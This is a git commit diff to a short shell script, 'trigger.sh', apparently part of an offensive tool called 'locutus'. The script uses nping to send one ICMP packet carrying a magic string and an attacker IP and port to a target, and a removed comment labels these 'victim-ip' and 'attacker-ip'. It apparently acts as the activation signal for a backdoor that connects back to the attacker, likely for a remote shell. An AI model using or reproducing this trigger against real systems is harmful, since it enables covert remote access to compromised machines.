ffc1c4c277b58783586d146d2a56de031279cc21
Terraminator <terraminator@protonmail.com>
2023-06-05 15:04:35 +0200

    Update trigger.sh

--- locutus/trigger.sh
+++ locutus/trigger.sh
@@ -1,2 +1,1 @@
-nping --icmp -c 1 -dest-ip $1 --data-string 'jack_crusher 192.168.178.73 1337'
-#$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'xCs!w@ <attacker-ip> <port>'
+nping --icmp -c 1 --dest-ip $1 --data-string "jack_crusher $2 $3"
